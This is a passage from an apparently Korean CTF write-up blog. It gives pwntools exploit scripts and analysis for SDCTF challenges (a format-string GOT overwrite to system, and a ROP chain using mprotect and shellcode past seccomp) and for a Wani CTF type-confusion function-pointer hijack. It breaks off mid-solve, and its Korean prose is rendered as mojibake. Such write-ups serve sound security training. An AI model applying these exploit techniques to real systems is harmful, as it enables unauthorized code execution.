class="line"></span><br><span class="line"><span class="comment">#51</span></span><br><span class="line"><span class="comment"># - 0x21c87</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;%57$p&#x27;</span></span><br><span class="line"><span class="comment"># payload = b&#x27;AAAAAAAA&#x27;</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x21c87</span></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># system = libc.symbols[&#x27;system&#x27;]</span></span><br><span class="line"><span class="comment"># binsh = next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, <span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">16</span>,</span><br><span class="line">        &#123;e.got[<span class="string">&#x27;printf&#x27;</span>] : p64(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[:<span class="number">4</span>] &#125;,</span><br><span class="line">        write_size = <span class="string">&#x27;short&#x27;</span>)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;?\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;-1&#x27;)</span></span><br><span class="line"><span class="comment"># p.sendlineafter(&#x27;?\n&#x27;, &#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># -1</span></span><br><span class="line"><span class="comment"># /bin/sh</span></span><br><span class="line"><span class="comment"># sdctf&#123;d4mn_y0u_f0unD_4_Cr4zY_4M0uN7_0f_M0n3y&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary                        : ‚úì (value: 0xedabb8ef1d292700)</span></span><br><span class="line"><span class="comment"># NX                            : ‚úì</span></span><br><span class="line"><span class="comment"># PIE                           : ‚úò</span></span><br><span class="line"><span class="comment"># Fortify                       : ‚úò</span></span><br><span class="line"><span class="comment"># RelRO                         : Partial</span></span><br></pre></td></tr></table></figure><h2 id="tROPic-thunder"><a href="#tROPic-thunder" class="headerlink" title="tROPic-thunder"></a>tROPic-thunder</h2><blockquote><p>I hope this isn‚Äôt your first rodeo<br>Connect via:¬†<code>nc thunder.sdc.tf 1337</code><br>Dockerfile¬†tROPic-thunder</p></blockquote><ul><li>[69 solves &#x2F; 250 points]</li></ul><h3 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x06 0xc000003e  if (A != ARCH_X86_64) goto 0008</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x03 0xffffffff  if (A != 0xffffffff) goto 0008</span><br><span class="line"> 0005: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0008</span><br><span class="line"> 0006: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0008</span><br><span class="line"> 0007: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0008: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>seccompÏù¥ Í±∏Î†§ÏûàÏßÄÎßå ÌèâÏù¥ÌïòÍ≤å Í±∏Î†§ÏûàÎã§. <code>execve</code>Î•º Ïã§ÌñâÏãúÌÇ§Ïûê.</p><p><code>mprotect</code>Í∞Ä ÏûàÎäî Ìïú, Ïù¥Í≤ÉÏùÑ Ïã§ÌñâÏãúÏºú ÌäπÏ†ï Í≥µÍ∞ÑÏóê Ïã§Ìñâ Í∂åÌïúÏùÑ Ï£ºÍ≥† Í±∞Í∏∞Ïóê Ïâò ÏΩîÎìúÎ•º ÎÑ£Ïñ¥ÏÑú Í∑∏ Í≥≥ÏúºÎ°ú Ï†êÌîÑÌïòÎäî ÏÉùÍ∞ÅÏùÑ ÌïòÏûê.</p><h3 id="Exploit-Code-2"><a href="#Exploit-Code-2" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./tROPic-thunder&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;thunder.sdc.tf&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./tROPic-thunder&#x27;</span>)</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x41003c</span></span><br><span class="line">pop_rax = <span class="number">0x4005af</span></span><br><span class="line">pop_rdi = <span class="number">0x4006a6</span></span><br><span class="line">pop_rsi = <span class="number">0x40165c</span></span><br><span class="line">pop_rdx = <span class="number">0x4589f5</span></span><br><span class="line"></span><br><span class="line">bss = e.bss() + <span class="number">0xc0</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x70</span> + <span class="number">0x8</span>)</span><br><span class="line"><span class="comment"># mprotect(bss, 0x1000, 7)</span></span><br><span class="line"><span class="comment"># payload += p64(pop_rax)</span></span><br><span class="line"><span class="comment"># payload += p64(10)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">7</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;mprotect&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"><span class="comment"># read(0, bss, 0x1000)</span></span><br><span class="line">payload += p64(pop_rax)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi)</span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>)</span><br><span class="line">payload += p64(pop_rdx)</span><br><span class="line">payload += p64(<span class="number">0x4000</span>)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"><span class="comment"># payload += p64(syscall)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload += p64(0x41414141) # jmp!</span></span><br><span class="line">payload += p64(<span class="number">0x000000006d9000</span>) <span class="comment"># jmp!</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;!\n&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># open, read, write</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += asm(shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>))</span><br><span class="line">payload += asm(shellcraft.read(<span class="number">3</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line">payload += asm(shellcraft.write(<span class="number">1</span>, <span class="string">&#x27;rsp&#x27;</span>, <span class="number">0x100</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = asm(payload)</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># sdctf&#123;I_w4tch3d_tR0p1c_7huNd3r_wh1l3_m4k1nG_7h1s_ch4al13ng3&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Partial RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      No PIE (0x400000)</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> San Diego </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> seccomp </tag>
            
            <tag> shellcode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Wani CTF 2023 - Time Table (type confusion)</title>
      <link href="/230509-wanictf2023-8.time-table/"/>
      <url>/230509-wanictf2023-8.time-table/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1988">https://ctftime.org/event/1988</a></li></ul><blockquote><p>Is your timetable alright?<br><code>nc timetable-pwn.wanictf.org 9008</code><br>Writer : EBeb</p></blockquote><ul><li>[33 solves &#x2F; 294 points]</li></ul><p>Ï≤òÏùå ÌíÄÏñ¥Î≥¥Îäî Type Confusion Ïú†Ìòï.<br>ÎÇ¥Í∞Ä ÏïÑÎäî Type ConfusionÏùÄ UAFÏôÄ Í≤∞Ìï©ÎêòÏñ¥ ÏûàÏóàÎäîÎç∞ Ïù¥Í±¥ ÏïÑÎãàÏóàÎã§. ÌíÄÏñ¥Î≥¥Îãà ÏÉùÍ∞ÅÎ≥¥Îã§ ÌíÄÎßåÌï¥ÏÑú ÎÜÄÎûêÎã§.<br>Îã§ ÌíÄÍ≥† ÎÇòÏÑú Î°∏ÏóÖÏùÑ ÏÑ∏ Í∞ú Î¥§ÎäîÎç∞ ÎòëÍ∞ôÏùÄ Ï∑®ÏïΩÏ†êÏùÑ Ïù¥Ïö©ÌñàÏúºÎÇò ÏùµÏä§Î∞©Î≤ïÏù¥ ÎÇòÏôÄ Ï°∞Í∏àÏî© Îã¨ÎûêÎã§. </p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ÏÜåÏä§ÏΩîÎìúÍ∞Ä Îã§ Ï£ºÏñ¥Ï†∏ÏûàÏñ¥ÏÑú Ï∞®Í∑ºÏ∞®Í∑º ÏùΩÏñ¥Î≥¥Î©¥ ÎêúÎã§. ÏùºÎã® Î¨∏Ï†ú Î∞îÏù¥ÎÑàÎ¶¨Î•º Ïã§ÌñâÌï¥Î≥¥Î©¥ ÏïÑÎûòÏôÄ Í∞ôÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">WELCOME TO THE TIME TABLE PROGRAM</span><br><span class="line">Enter your name : aaaa</span><br><span class="line">Enter your student id : 1</span><br><span class="line">Enter your major : 1</span><br><span class="line"></span><br><span class="line">        MON             TUE             WED             THU             FRI</span><br><span class="line">1       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">2       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">3       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">4       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line">5       (null)          (null)          (null)          (null)          (null)          </span><br><span class="line"></span><br><span class="line">1. Register Mandatory Class</span><br><span class="line">2. Register Elective Class</span><br><span class="line">3. See Class Detail</span><br><span class="line">4. Write Memo</span><br><span class="line">5. Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>Ï≤òÏùåÏóê name, id, majorÎ•º ÏûÖÎ†•ÌïòÍ≥† ÏãúÍ∞ÑÌëúÎ°ú Î≥¥Ïù¥Îäî Í≤ÉÏùÑ Ï∂úÎ†•Ìïú ÌõÑ, exitÏùÑ Ï†úÏô∏ÌïòÍ≥† 4Í∞ÄÏßÄÏùò Í∏∞Îä•ÏùÑ Ïã§ÌñâÌï† Ïàò ÏûàÎèÑÎ°ù ÎêòÏñ¥ÏûàÎã§. Î®ºÏ†Ä registerÏôÄ Í¥ÄÎ†®Îêú Í∏∞Îä•ÏùÑ ÏÇ¥Ìé¥Î¥§ÏùÑ Îïå <code>mandatory_subject</code>ÏôÄ <code>elective_subject</code> Íµ¨Ï°∞Ï≤¥Í∞Ä Î≥¥ÏòÄÎã§. Í∑∏Î¶¨Í≥† 4Î≤à Î©îÎâ¥Í∞Ä ÏàòÏÉÅÌï¥ Î≥¥Ïó¨ÏÑú Ìï¥Îãπ Ìï®ÏàòÎèÑ Ìï®Íªò Î¥§Îã§.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">register_mandatory_class</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  mandatory_subject choice;</span><br><span class="line">  print_table(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-----Mandatory Class List-----\n&quot;</span>);</span><br><span class="line">  print_mandatory_list();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i); <span class="comment">// ÏùåÏàò Í∞ÄÎä•</span></span><br><span class="line">  choice = mandatory_list[i]; <span class="comment">// oob ?</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, choice.time[<span class="number">0</span>]);</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].name = choice.name;</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].type = MANDATORY_CLASS_CODE;</span><br><span class="line">  timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].detail = &amp;mandatory_list[i];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">register_elective_class</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  elective_subject choice;</span><br><span class="line">  print_table(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;-----Elective Class List-----\n&quot;</span>);</span><br><span class="line">  print_elective_list();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">  choice = elective_list[i];</span><br><span class="line">  <span class="keyword">if</span> (choice.IsAvailable(&amp;user) == <span class="number">1</span>) &#123;</span><br><span class="line">    timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].name = choice.name;</span><br><span class="line">    <span class="comment">// The type of timetable is 0 by default since it is a global value.</span></span><br><span class="line">    timetable[choice.time[<span class="number">0</span>]][choice.time[<span class="number">1</span>]].detail = &amp;elective_list[i];</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can&#x27;t register this class\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>register_elective_class</code> Ìï®ÏàòÏóêÏÑú <code>choice.IsAvailable(&amp;user)</code>Î•º Ïã§ÌñâÌïòÎäî Î∂ÄÎ∂ÑÏù¥ ÏûàÎã§. <code>user</code>Îäî ÌîÑÎ°úÍ∑∏Îû® Îß® Ï≤òÏùå ÎÇòÏùò ÏûÖÎ†•Í∞íÏù¥Îã§. <code>elective_subject</code> Íµ¨Ï°∞Ï≤¥ ÏïàÏóê Ìï®ÏàòÌè¨Ïù∏ÌÑ∞Í∞Ä ÏûàÏùåÏùÑ ÌôïÏù∏ÌñàÎã§. (ÎßåÏïΩ Ïù¥ Ìï®ÏàòÌè¨Ïù∏ÌÑ∞Î•º ÎçÆÏùÑ Ïàò ÏûàÎã§Î©¥, <code>system</code> Ìï®ÏàòÎ°ú ÎçÆÍ≥†, Ïù∏ÏûêÎ°ú Îì§Ïñ¥Í∞Ñ ÎÇòÏùò ÏûÖÎ†•Í∞í <code>user</code>Îäî <code>/bin/sh</code>Î•º ÎÑ£Ïñ¥ÏïºÍ≤†Îã§.)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">write_memo</span><span class="params">()</span> &#123;</span><br><span class="line">  comma *choice = choose_time(timetable);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;WRITE MEMO FOR THE CLASS\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (choice-&gt;type == MANDATORY_CLASS_CODE) &#123;</span><br><span class="line">    read(<span class="number">0</span>, ((mandatory_subject *)choice-&gt;detail)-&gt;memo, <span class="number">30</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (choice-&gt;type == ELECTIVE_CLASS_CODE) &#123;</span><br><span class="line">    read(<span class="number">0</span>, ((elective_subject *)choice-&gt;detail)-&gt;memo, <span class="number">30</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>choice-&gt;type</code>ÏùÑ Í∏∞Ï§ÄÏúºÎ°ú <code>memo</code>Ïóê 30Í∏ÄÏûê ÏûÖÎ†•ÌïúÎã§. Ïó¨Í∏∞ÏÑú ÎßåÏïΩ Type confusionÏù¥ Î∞úÏÉùÌïúÎã§Î©¥ Î≥∏ÎûòÎäî <code>mandatory_subject</code>Ïù∏Îç∞ <code>elective_subject</code>ÏúºÎ°ú Ï∞©Í∞ÅÌï¥ÏÑú <code>elective_subject</code> Íµ¨Ï°∞Ï≤¥Ïóê ÏûÖÎ†•ÏùÑ ÌïòÍ≤å Îê† Í≤ÉÏù¥Îã§. Íµ¨Ï°∞Ï≤¥ offsetÏùÑ ÏÇ¥Ìé¥Î≥¥Í≥† Ïú†ÏùòÎØ∏Ìïú ÏúÑÏπòÏóê Ïì∞Í∏∞Î•º Ìï† Ïàò ÏûàÎäîÏßÄ ÏÉùÍ∞ÅÌï¥Î≥¥Ïûê.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name; <span class="comment">// 0~8</span></span><br><span class="line">  <span class="type">int</span> time[<span class="number">2</span>]; <span class="comment">// 8~16</span></span><br><span class="line">  <span class="type">char</span> *target[<span class="number">4</span>]; <span class="comment">// 16~48</span></span><br><span class="line">  <span class="type">char</span> memo[<span class="number">32</span>]; <span class="comment">// 48~80</span></span><br><span class="line">  <span class="type">char</span> *professor; <span class="comment">// 80~88</span></span><br><span class="line">&#125; mandatory_subject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name; <span class="comment">// 0~8</span></span><br><span class="line">  <span class="type">int</span> time[<span class="number">2</span>]; <span class="comment">// 8~16</span></span><br><span class="line">  <span class="type">char</span> memo[<span class="number">32</span>]; <span class="comment">// 16~48</span></span><br><span class="line">  <span class="type">char</span> *professor; <span class="comment">// 48~56</span></span><br><span class="line">  <span class="type">int</span> (*IsAvailable)(student *); <span class="comment">// 56~64</span></span><br><span class="line">&#125; elective_subject;</span><br></pre></td></tr></table></figure><p>Ï£ºÏÑùÏúºÎ°ú offsetÏùÑ Ï†ÅÏñ¥ÎÜ®Îã§. <code>mandatory_subject</code> Íµ¨Ï°∞Ï≤¥Ïùò <code>memo</code>Îäî 48Î≤àÏß∏Ïóê ÏúÑÏπòÌïúÎã§. <code>elective_subject</code> Íµ¨Ï°∞Ï≤¥Ïùò 48Î≤àÏß∏Îäî <code>*proffesor</code>Ïù¥Îã§. <code>write_memo</code> Ìï®ÏàòÏóêÏÑú 30Î∞îÏù¥Ìä∏Î•º Ïì∏ Ïàò ÏûàÏóàÏúºÎãà Îí§Ïùò Ìï®ÏàòÌè¨Ïù∏ÌÑ∞Î•º ÎçÆÏùÑ Ïàò ÏûàÎã§.</p><p><code>elective_subject</code> Íµ¨Ï°∞Ï≤¥Î•º <code>mandatory_subject</code> Íµ¨Ï°∞Ï≤¥Î°ú Ìó∑Í∞àÎ¶¨Í≥† <code>memo</code>Î•º ÏûëÏÑ±ÌïòÍ≤å ÎêúÎã§Î©¥ <code>elective_subject</code> Íµ¨Ï°∞Ï≤¥Ïùò Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Î•º ÎçÆÏñ¥ <code>register_elective_class</code> Ìï®ÏàòÏóêÏÑú Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Î•º Ïã§ÌñâÏãúÏºú ÌùêÎ¶ÑÏùÑ Î≥ÄÍ≤ΩÌï† Ïàò ÏûàÏùÑ Í≤ÉÏù¥Îã§.</p><p>Í∑∏ Ï†ÑÏóê libc leakÏùÑ Ìï¥ÏïºÌïòÎäîÎç∞ leakÎèÑ Type confusionÏùÑ Ïù¥Ïö©Ìï¥ÏÑú Ìï† Ïàò ÏûàÎã§. Î∞òÎåÄÎ°ú Type confusionÏùÑ ÏùºÏúºÌÇ§Î©¥ ÎêúÎã§. Íµ¨Ï°∞Î•º printÌïòÎäî Í∏∞Îä•Ïù¥ ÏûàÏñ¥ÏÑú leakÏù¥ Í∞ÄÎä•ÌïòÎã§.</p><p><code>mandatory_subject</code> Íµ¨Ï°∞Ï≤¥Î•º <code>elective_subject</code> Íµ¨Ï°∞Ï≤¥Î°ú Ìó∑Í∞àÎ¶¨Í≥† <code>memo</code>Î•º ÏûëÏÑ±ÌïòÍ≤å ÎêúÎã§Î©¥ <code>mandatory_subject</code> Íµ¨Ï°∞Ï≤¥ÏóêÏÑú <code>*target[4]</code>ÏùÑ ÎçÆÍ≤å ÎêúÎã§. Ïó¨Í∏∞Ïóê <code>GOTÍ∞Ä Ï†ÄÏû•Îêú Ï£ºÏÜå</code>Î•º Ï†ÅÍ≥† Íµ¨Ï°∞Î•º printÌï¥Ï£ºÎäî <code>print_mandatory_subject</code> Ìï®ÏàòÏóêÏÑú <code>GOT</code>Í∞Ä Ï∂úÎ†•Îê† Í≤ÉÏù¥Îã§.</p><p>ÌïòÏßÄÎßå ÎÇú Ïù¥ Î∞©Î≤ïÏùÄ ÏÇ¨Ïö©ÌïòÏßÄ ÏïäÍ≥† Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞Î•º ÎçÆÎäî Í≥ºÏ†ïÏóêÏÑú <code>_IO_2_1_stdout_</code>Ï†ÑÍπåÏßÄ ÏûÖÎ†•Í∞íÏùÑ Ï£ºÏñ¥ <code>print_elective_subject</code> Ìï®ÏàòÏóêÏÑú <code>memo</code>Î•º Ï∂úÎ†•Ìï† Îïå <code>GOT</code>Í∞Ä Í∞ôÏù¥ Ï∂úÎ†•ÎêòÎèÑÎ°ù ÌñàÍ∏∞ ÎïåÎ¨∏Ïóê Î≥¥Îã§ Ìé∏ÌïòÍ≤å <code>libc address</code>Î•º Íµ¨Ìï† Ïàò ÏûàÏóàÎã§.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x405250 &lt;elective_list+112&gt;:   0x6161616161616161      0x6262626262626262</span><br><span class="line">0x405260 &lt;stdout@GLIBC_2.2.5&gt;:  0x00007faa16da05a0      0x0000000000000000</span><br></pre></td></tr></table></figure><p>ÎßàÏßÄÎßâÏúºÎ°ú ÏÇ¨Ïã§ <code>register_elective_class</code> Ìï®ÏàòÎ•º Ïã§ÌñâÏãúÌÇ§Í∏∞ ÏúÑÌï¥ÏÑúÎäî Ï°∞Í±¥Ïù¥ ÌïòÎÇò ÌïÑÏöîÌïòÎã§. Î∞îÎ°ú Îß® Ï≤òÏùåÏóê ÏûÖÎ†•ÌïòÎäî <code>name</code>, <code>id</code>, <code>major</code>ÏóêÏÑú <code>id</code>ÏôÄ <code>major</code>Í∞Ä ÌäπÏ†ï Í∞í Ïù¥ÏÉÅÏù¥Í±∞ÎÇò Ïù¥ÌïòÏó¨Ïïº ÌïúÎã§Îäî Ï°∞Í±¥Ïù¥ ÏûàÎã§. Ïù¥ Ï°∞Í±¥ÏùÑ Í∞ÄÏû• Î®ºÏ†Ä ÎßûÏ∂∞Ï£ºÏñ¥Ïïº ÌïúÎã§.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ol><li><code>name</code>ÏóêÎäî <code>/bin/sh</code>, <code>id</code>ÏóêÎäî <code>2000</code>, <code>major</code>ÏóêÎäî <code>100</code>ÏùÑ ÏûÖÎ†•</li><li><code>libc leak</code> : <code>write_memo</code>Î•º Ïù¥Ïö©ÌïòÏó¨ <code>stdout</code> Ï†ÑÍπåÏßÄ ÏûÖÎ†• ÌõÑ, <code>print_elective_subject</code> Ìï®ÏàòÏóêÏÑú Íµ¨Ï°∞ Ï∂úÎ†•ÌïòÏó¨ <code>_IO_2_1_stdout_</code> Íµ¨Ìï®</li><li>Ìï®Ïàò Ìè¨Ïù∏ÌÑ∞ 